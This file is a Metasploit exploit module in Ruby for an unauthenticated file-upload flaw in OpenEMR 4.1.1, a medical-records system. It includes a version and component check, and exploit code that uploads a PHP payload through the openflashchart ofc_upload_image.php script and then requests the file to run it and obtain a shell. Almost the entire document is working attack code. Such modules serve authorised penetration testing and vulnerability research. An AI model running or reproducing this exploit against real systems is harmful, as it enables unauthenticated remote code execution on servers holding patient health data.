##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::FileDropper

	def initialize(info={})
		super(update_info(info,
			'Name'           => "OpenEMR PHP File Upload Vulnerability",
			'Description'    => %q{
					This module exploits a vulnerability found in OpenEMR 4.1.1 By abusing the
				ofc_upload_image.php file from the openflashchart library, a malicious user can
				upload a file to the tmp-upload-images directory without any authentication, which
				results in arbitrary code execution. The module has been tested successfully on
				OpenEMR 4.1.1 over Ubuntu 10.04.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Gjoko Krstic <gjoko[at]zeroscience.mk>', # Discovery, PoC
					'juan vazquez' # Metasploit module
				],
			'References'     =>
				[
					[ 'OSVDB', '90222' ],
					[ 'BID', '37314' ],
					[ 'EBD', '24492' ],
					[ 'URL', 'http://www.zeroscience.mk/en/vulnerabilities/ZSL-2013-5126.php' ],
					[ 'URL', 'http://www.open-emr.org/wiki/index.php/OpenEMR_Patches' ]
				],
			'Platform'       => ['php'],
			'Arch'           => ARCH_PHP,
			'Targets'        =>
				[
					['OpenEMR 4.1.1', {}]
				],
			'Privileged'     => false,
			'DisclosureDate' => "Feb 13 2013",
			'DefaultTarget'  => 0))

			register_options(
				[
					OptString.new('TARGETURI', [true, 'The base path to EGallery', '/openemr'])
				], self.class)
	end

	def check
		uri = target_uri.path
		peer = "#{rhost}:#{rport}"

		# Check version
		print_status("#{peer} - Trying to detect installed version")

		res = send_request_cgi({
			'method' => 'GET',
			'uri'    => normalize_uri(uri, "interface", "login", "login.php")
		})

		if res and res.code == 200 and res.body =~ /v(\d\.\d\.\d)/
			version = $1
		else
			return Exploit::CheckCode::Unknown
		end

		print_status("#{peer} - Version #{version} detected")

		if version > "4.1.1"
			return Exploit::CheckCode::Safe
		end

		# Check for vulnerable component
		print_status("#{peer} - Trying to detect the vulnerable component")

		res = send_request_cgi({
			'method' => 'GET',
			'uri'    => normalize_uri("#{uri}", "library", "openflashchart", "php-ofc-library", "ofc_upload_image.php"),
		})

		if res and res.code == 200 and res.body =~ /Saving your image to/
			return Exploit::CheckCode::Detected
		end

		return Exploit::CheckCode::Safe
	end

	def exploit
		uri = target_uri.path

		peer = "#{rhost}:#{rport}"
		payload_name = rand_text_alpha(rand(10) + 5) + '.php'
		my_payload = payload.encoded

		print_status("#{peer} - Sending PHP payload (#{payload_name})")
		res = send_request_raw({
			'method'  => 'POST',
			'uri'     => normalize_uri("#{uri}", "library", "openflashchart", "php-ofc-library", "ofc_upload_image.php") + "?name=#{payload_name}",
			'headers' => { "Content-Length" => my_payload.length.to_s },
			'data'    => my_payload
		})

		# If the server returns 200 and the body contains our payload name,
		# we assume we uploaded the malicious file successfully
		if not res or res.code != 200 or res.body !~ /Saving your image to.*#{payload_name}$/
			fail_with(Exploit::Failure::NotVulnerable, "#{peer} - File wasn't uploaded, aborting!")
		end

		register_file_for_cleanup(payload_name)

		print_status("#{peer} - Executing PHP payload (#{payload_name})")
		# Execute our payload
		res = send_request_cgi({
			'method' => 'GET',
			'uri'    => normalize_uri("#{uri}", "library", "openflashchart", "tmp-upload-images", payload_name),
		})

		# If we don't get a 200 when we request our malicious payload, we suspect
		# we don't have a shell, either.  Print the status code for debugging purposes.
		if res and res.code != 200
			print_error("#{peer} - Server returned #{res.code.to_s}")
		end
	end

end
